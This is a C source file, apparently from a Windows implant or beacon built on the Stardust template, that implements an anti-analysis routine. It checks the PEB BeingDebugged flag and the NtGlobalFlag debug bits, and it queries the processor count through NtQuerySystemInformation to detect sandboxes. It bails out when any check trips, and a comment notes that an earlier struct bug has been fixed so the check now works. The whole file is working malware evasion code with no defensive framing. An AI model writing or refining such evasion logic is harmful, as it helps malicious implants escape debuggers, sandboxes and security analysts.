#include "Common.h"
#include "Constexpr.h"
#include "Dbg.h"

FUNC BOOL NaxAntiAnalysis( VOID ) {
    STARDUST_INSTANCE

    // 1) Debugger check via PEB
    if ( NtCurrentPeb()->BeingDebugged ) {
        NAXDBG( MOD(Kernel32), "aa1-dbg\r\n" );
        return FALSE;
    }

    ULONG ntGlobal = *(PULONG)( (PBYTE)NtCurrentPeb() + 0xBC );
    NAXDBGX( MOD(Kernel32), "aa2-gflag=", ntGlobal );
    if ( (ntGlobal & 0x70) != 0 ) {
        NAXDBG( MOD(Kernel32), "aa2-gflag-F\r\n" );
        return FALSE;
    }

    // 2) Processor count via NtQuerySystemInformation (class 0 = SystemBasicInformation)
    //    Layout matches ntdll/src_beacon's SYSTEM_BASIC_INFORMATION: the old
    //    code read SYSTEM_INFO (wrong struct) - the check was inert.
    if ( API(NtQuerySystemInformation) ) {
        struct {
            ULONG    Reserved;
            ULONG    TimerResolution;
            ULONG    PageSize;
            ULONG    NumberOfPhysicalPages;
            ULONG    LowestPhysicalPageNumber;
            ULONG    HighestPhysicalPageNumber;
            ULONG    AllocationGranularity;
            ULONG_PTR MinimumUserModeAddress;
            ULONG_PTR MaximumUserModeAddress;
            ULONG_PTR ActiveProcessorsAffinityMask;
            CCHAR    NumberOfProcessors;
        } sbi = { 0 };
        NTSTATUS st = ( (pNtQuerySystemInformation)API(NtQuerySystemInformation) )(
            0, &sbi, sizeof(sbi), NULL );
        NAXDBGX( MOD(Kernel32), "aa3-sbi=", st );
        if ( NT_SUCCESS(st) && sbi.NumberOfProcessors < 2 ) {
            NAXDBG( MOD(Kernel32), "aa3-cpu-F\r\n" );
            return FALSE;
        }
    }

    return TRUE;
}
